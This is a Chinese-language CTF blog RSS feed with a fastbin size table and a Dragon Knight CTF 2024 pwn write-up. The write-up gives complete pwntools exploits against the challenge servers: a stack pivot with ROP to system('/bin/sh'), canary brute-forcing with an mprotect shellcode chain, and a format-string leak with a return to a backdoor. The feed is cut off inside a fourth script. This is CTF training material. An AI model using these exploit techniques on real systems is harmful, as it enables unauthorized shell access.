<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>feichai&#39;s Blog</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>柴柴就是世界第一可爱！！!</description>
    <pubDate>Mon, 10 Jun 2024 09:54:51 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>嘿嘿嘿</title>
      <link>http://example.com/2024/06/10/%E5%98%BF%E5%98%BF%E5%98%BF/</link>
      <guid>http://example.com/2024/06/10/%E5%98%BF%E5%98%BF%E5%98%BF/</guid>
      <pubDate>Mon, 10 Jun 2024 09:51:06 GMT</pubDate>
      
      <description>Here&#39;s something encrypted, password is required to continue reading.</description>
      
      
      
      <content:encoded><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b77777225d76564fc56a0e121b93268c8d9f9a118771e19f9f84c1afcaa4ef13"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/06/10/%E5%98%BF%E5%98%BF%E5%98%BF/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>关于fastbin的范围参考</title>
      <link>http://example.com/2024/06/08/%E5%85%B3%E4%BA%8Efastbin%E7%9A%84%E8%8C%83%E5%9B%B4%E5%8F%82%E8%80%83/</link>
      <guid>http://example.com/2024/06/08/%E5%85%B3%E4%BA%8Efastbin%E7%9A%84%E8%8C%83%E5%9B%B4%E5%8F%82%E8%80%83/</guid>
      <pubDate>Fri, 07 Jun 2024 16:04:06 GMT</pubDate>
      
      <description>&lt;p&gt;关于fastbin的范围参考&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>关于fastbin的范围参考</p><span id="more"></span><p>来源：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/">和媳妇一起学Pwn 之 Secret Garden | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p>32位：</p><table><thead><tr><th align="left">gef fastbin item</th><th align="left">chunk size</th><th align="left">data interval</th><th align="left">fake chunk size</th></tr></thead><tbody><tr><td align="left">Fastbins[idx&#x3D;0, size&#x3D;0x8]</td><td align="left">0x10</td><td align="left">[0x01,0x0c] , [1,12]</td><td align="left">[0x10,0x17]</td></tr><tr><td align="left">Fastbins[idx&#x3D;1, size&#x3D;0x10]</td><td align="left">0x18</td><td align="left">[0x0d,0x14] , [13,20]</td><td align="left">[0x18,0x1f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;2, size&#x3D;0x18]</td><td align="left">0x20</td><td align="left">[0x15,0x1c] , [21,28]</td><td align="left">[0x20,0x27]</td></tr><tr><td align="left">Fastbins[idx&#x3D;3, size&#x3D;0x20]</td><td align="left">0x28</td><td align="left">[0x1d,0x24] , [29,36]</td><td align="left">[0x28,0x2f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;4, size&#x3D;0x28]</td><td align="left">0x30</td><td align="left">[0x25,0x2c] , [37,44]</td><td align="left">[0x30,0x37]</td></tr><tr><td align="left">Fastbins[idx&#x3D;5, size&#x3D;0x30]</td><td align="left">0x38</td><td align="left">[0x2d,0x34] , [45,52]</td><td align="left">[0x38,0x3f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;6, size&#x3D;0x38]</td><td align="left">0x40</td><td align="left">[0x35,0x3c] , [53,60]</td><td align="left">[0x40,0x47]</td></tr></tbody></table><p>64 位：</p><table><thead><tr><th align="left">gef fastbin item</th><th align="left">chunk size</th><th align="left">data interval</th><th align="left">fake chunk size</th></tr></thead><tbody><tr><td align="left">Fastbins[idx&#x3D;0, size&#x3D;0x10]</td><td align="left">0x20</td><td align="left">[0x01,0x18] , [1,24]</td><td align="left">[0x20,0x2f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;1, size&#x3D;0x20]</td><td align="left">0x30</td><td align="left">[0x19,0x28] , [25,40]</td><td align="left">[0x30,0x3f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;2, size&#x3D;0x30]</td><td align="left">0x40</td><td align="left">[0x29,0x38] , [41,56]</td><td align="left">[0x40,0x4f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;3, size&#x3D;0x40]</td><td align="left">0x50</td><td align="left">[0x39,0x48] , [57,72]</td><td align="left">[0x50,0x5f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;4, size&#x3D;0x50]</td><td align="left">0x60</td><td align="left">[0x49,0x58] , [73,88]</td><td align="left">[0x60,0x6f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;5, size&#x3D;0x60]</td><td align="left">0x70</td><td align="left">[0x59,0x68] , [89,104]</td><td align="left">[0x70,0x7f]</td></tr><tr><td align="left">Fastbins[idx&#x3D;6, size&#x3D;0x70]</td><td align="left">0x80</td><td align="left">[0x69,0x78] , [105,120]</td><td align="left">[0x80,0x8f]</td></tr></tbody></table>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      
      <comments>http://example.com/2024/06/08/%E5%85%B3%E4%BA%8Efastbin%E7%9A%84%E8%8C%83%E5%9B%B4%E5%8F%82%E8%80%83/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Dragon Knight CTF 2024 pwn wp</title>
      <link>http://example.com/2024/05/26/Dragon-Knight-CTF-2024-pwn-wp/</link>
      <guid>http://example.com/2024/05/26/Dragon-Knight-CTF-2024-pwn-wp/</guid>
      <pubDate>Sun, 26 May 2024 14:39:09 GMT</pubDate>
      
      <description>&lt;p&gt;Dragon Knight CTF 2024 pwn wp&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Dragon Knight CTF 2024 pwn wp</p><span id="more"></span><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>非常经典的栈迁移例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = <span class="string">&#x27;/home/feichai/ctf_file/libc-2.31.so&#x27;</span></span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">31728</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    puts_plt=elf.plt.puts</span><br><span class="line">    puts_got=elf.got.puts</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x0000000000401210</span></span><br><span class="line">    leave_ret = <span class="number">0x00000000004011be</span></span><br><span class="line">    bss = <span class="number">0x404040</span> + <span class="number">0x500</span></span><br><span class="line">    pop_rbp = <span class="number">0x000000000040115d</span></span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(bss+<span class="number">0x100</span>)+p64(<span class="number">0x40118F</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)</span><br><span class="line">    pd+=p64(pop_rbp)+p64(bss+<span class="number">0x500</span>)+p64(<span class="number">0x40118F</span>)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line">    </span><br><span class="line">    leak_libc = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = leak_libc-libc.symbols[<span class="string">b&#x27;puts&#x27;</span>]</span><br><span class="line">    libc_system = libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    pd=p64(pop_rdi)+p64(bin_sh_addr)+p64(libc_system)</span><br><span class="line">    pd=pd.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(bss+<span class="number">0x500</span>-<span class="number">0x100</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">    </span><br><span class="line">    sa(<span class="string">b&#x27;pivoting?&#x27;</span>,pd)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>爆破canary然后用mprotect提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>,<span class="number">30537</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;input:\n&#x27;</span>)</span><br><span class="line">    canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="comment">#sleep(0.1)</span></span><br><span class="line">            s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + canary + p8(i))</span><br><span class="line">            aa = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;smashing&#x27;</span> <span class="keyword">in</span> aa:</span><br><span class="line">                ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                canary += p8(i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">b&quot;canary: &quot;</span> + canary)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x00000000004018c2</span></span><br><span class="line">    pop_rsi = <span class="number">0x000000000040f23e</span></span><br><span class="line">    pop_rdx = <span class="number">0x00000000004017cf</span></span><br><span class="line"></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + canary + <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line">    got_plt = <span class="number">0x4c1000</span></span><br><span class="line">    call_mprotect = <span class="number">0x449774</span></span><br><span class="line">    call_read = <span class="number">0x448920</span></span><br><span class="line"></span><br><span class="line">    pd += p64(pop_rdi) + p64(got_plt)</span><br><span class="line">    pd += p64(pop_rsi) + p64(<span class="number">0x1000</span>) </span><br><span class="line">    pd += p64(pop_rdx) + p64(<span class="number">7</span>)</span><br><span class="line">    pd += p64(call_mprotect)</span><br><span class="line">    </span><br><span class="line">    pd += p64(pop_rdi) + p64(<span class="number">0</span>)</span><br><span class="line">    pd += p64(pop_rsi) + p64(got_plt)</span><br><span class="line">    pd += p64(pop_rdx) + p64(<span class="number">0xff</span>)</span><br><span class="line">    pd += p64(call_read) + p64(got_plt)</span><br><span class="line"></span><br><span class="line">    s(pd)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sc = asm(shellcraft.sh())</span><br><span class="line">    s(sc)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a>ez_quiz</h3><p>解密不太会，用gpt写的，然后就是eval计算，fmt泄露基址，溢出返回backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/ez_quiz&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x1E71)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">30162</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a,drop=<span class="literal">True</span>)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    sla(<span class="string">&quot;Please give me your token:&quot;</span>,<span class="string">&#x27;DRKCTF&#123;P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie&#125;&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Right!&#x27;</span>)</span><br><span class="line">    ans = <span class="built_in">eval</span>(ru(<span class="string">&#x27;=&#x27;</span>))</span><br><span class="line">    sla(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(ans))</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">&#x27;gift:\n&#x27;</span>,<span class="string">&#x27;%13$p%11$p&#x27;</span>) <span class="comment"># 6</span></span><br><span class="line">    leak_pie = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(r(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">    lg(<span class="string">&#x27;leak_pie&#x27;</span>,leak_pie)</span><br><span class="line">    lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line">    pie_base = leak_pie - <span class="number">0x2042</span></span><br><span class="line">    backdoor = pie_base + <span class="number">0x1426</span></span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)+p64(canary)+p64(<span class="number">1</span>)+p64(backdoor)</span><br><span class="line">    sl(pd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="srop-seccomp"><a href="#srop-seccomp" class="headerlink" title="srop_seccomp"></a>srop_seccomp</h3><p>题目即考点，基础题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/chall&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;challenge.qsnctf.com&quot;</span>, <span class="number">30374</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span 